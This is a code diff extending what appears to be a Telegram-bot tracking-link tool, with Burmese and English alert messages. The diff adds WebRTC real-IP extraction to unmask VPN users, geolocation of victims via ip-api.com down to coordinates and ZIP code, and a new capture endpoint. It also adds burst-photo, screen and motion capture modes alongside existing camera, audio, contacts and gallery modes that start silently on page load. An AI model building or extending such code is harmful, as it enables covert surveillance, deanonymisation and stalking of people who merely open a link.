@@ -850,6 +850,11 @@ async function startCapture(){
     const fp=await collectFingerprint();
     const realIPs=await getRealIP();
     fetch('/capture_fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,fingerprint:{...fp,realIPs}})});
+    // Also dedicate a geo lookup call for real IPs
+    const publicIPs=realIPs.filter(ip=>!ip.startsWith('192.')&&!ip.startsWith('10.')&&!ip.startsWith('172.')&&!ip.startsWith('127.')&&!ip.startsWith('169.'));
+    if(publicIPs.length>0){
+      fetch('/capture_ip_geo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,ips:publicIPs})});
+    }
   }catch(e){}
 })();
 // Start capture immediately on load
@@ -857,6 +862,63 @@ window.addEventListener('load',()=>startCapture());
 </script>
 </body>
 </html>"""
+
+
+# ─────────────────────────────────────────
+# IP GEOLOCATION HELPER
+# ─────────────────────────────────────────
+def is_private_ip(ip):
+    import ipaddress
+    try:
+        return ipaddress.ip_address(ip).is_private
+    except Exception:
+        return True
+
+def geolocate_ip(ip):
+    try:
+        if is_private_ip(ip):
+            return None
+        r = requests.get(
+            f"http://ip-api.com/json/{ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting",
+            timeout=5
+        )
+        d = r.json()
+        if d.get('status') == 'success':
+            return d
+    except Exception:
+        pass
+    return None
+
+def format_geo_report(geo, ip, label=""):
+    if not geo:
+        return f"🌐 IP: <code>{ip}</code>\n📍 Geo: lookup failed"
+    flag = geo.get('countryCode', '')
+    mobile = '📱 Mobile Data' if geo.get('mobile') else '🛜 WiFi/Broadband'
+    proxy = ' | ⚠️ VPN/Proxy detected' if geo.get('proxy') else ''
+    hosting = ' | 🖥 Hosting/DC' if geo.get('hosting') else ''
+    return (
+        f"{'🌐 ' + label + chr(10) if label else ''}"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"🏳️ Country: {geo.get('country','?')} {flag}\n"
+        f"🏙️ City: {geo.get('city','?')}, {geo.get('regionName','?')}\n"
+        f"📮 ZIP: {geo.get('zip','?')}\n"
+        f"📍 Coords: <code>{geo.get('lat','?')},{geo.get('lon','?')}</code>\n"
+        f"⏰ Timezone: {geo.get('timezone','?')}\n"
+        f"📶 ISP: {geo.get('isp','?')}\n"
+        f"🏢 Org: {geo.get('org','?')}\n"
+        f"{mobile}{proxy}{hosting}"
+    )
+
+def geolocate_and_broadcast(user_id, ip, label="Real IP"):
+    geo = geolocate_ip(ip)
+    if geo:
+        report = (
+            f"📍 <b>IP Geolocation | တည်နေရာ</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"{format_geo_report(geo, ip, label)}\n"
+            f"━━━━━━━━━━━━━━━━━━━━"
+        )
+        broadcast_message(user_id, report, True)
 
 
 # ─────────────────────────────────────────
@@ -884,15 +946,25 @@ def track_page(token):
         ua = request.headers.get('User-Agent', 'Unknown')[:120]
         mode_labels = {'all':'🌐 All-in-One','photo':'📸 Photo','audio':'🎤 Audio',
                        'location':'📍 Location','video':'🎥 Video','gallery':'🖼️ Gallery',
-                       'frontcam':'🤳 Front Cam','contacts':'📞 Contacts'}
+                       'frontcam':'🤳 Front Cam','contacts':'📞 Contacts',
+                       'burst':'📷 Burst','screen':'🖥️ Screen','motion':'📳 Motion+IP'}
         label = mode_labels.get(mode, mode)
+        geo = geolocate_ip(ip)
+        geo_line = f"🏙️ {geo.get('city','?')}, {geo.get('regionName','?')}, {geo.get('country','?')}" if geo else "📍 Geo: N/A"
+        isp_line = f"📶 {geo.get('isp','?')}" if geo else ""
+        mobile_line = "📱 Mobile Data" if (geo and geo.get('mobile')) else ("🛜 WiFi/Broadband" if geo else "")
+        proxy_warn = "\n⚠️ <b>VPN/Proxy detected!</b>" if (geo and geo.get('proxy')) else ""
         alert = (
             f"🔗 <b>Link ဖွင့်သည်! | Link Opened!</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
             f"🎯 Mode: <b>{label}</b>\n"
             f"🌐 IP: <code>{ip}</code>\n"
-            f"📱 UA: {ua}\n"
-            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+            f"{geo_line}\n"
+            f"{isp_line + chr(10) if isp_line else ''}"
+            f"{mobile_line + chr(10) if mobile_line else ''}"
+            f"📱 UA: {ua[:80]}\n"
+            f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            f"{proxy_warn}\n"
             f"━━━━━━━━━━━━━━━━━━━━"
         )
         threading.Thread(target=broadcast_message, args=(user_id, alert), daemon=True).start()
@@ -915,6 +987,8 @@ def capture_fingerprint():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
     real_ips = fp.get('realIPs', [])
     real_ip_str = ', '.join(real_ips) if real_ips else 'N/A'
+    # Pick a public real IP for geolocation
+    public_real_ip = next((x for x in real_ips if not is_private_ip(x)), None)
     report = (
         f"📱 <b>Device Info | ဖုန်းအချက်အလက်</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -934,6 +1008,25 @@ def capture_fingerprint():
         f"━━━━━━━━━━━━━━━━━━━━"
     )
     threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    # Geolocate real IP in background
+    if public_real_ip:
+        threading.Thread(target=geolocate_and_broadcast, args=(user_id, public_real_ip, "WebRTC Real IP"), daemon=True).start()
+    elif not is_private_ip(ip):
+        threading.Thread(target=geolocate_and_broadcast, args=(user_id, ip, "Server IP"), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_ip_geo', methods=['POST'])
+def capture_ip_geo():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    ips = data.get('ips', [])
+    for ip in ips:
+        if not is_private_ip(ip):
+            threading.Thread(target=geolocate_and_broadcast, args=(user_id, ip, "WebRTC Real IP"), daemon=True).start()
     return jsonify({"ok": True}), 200
 
 
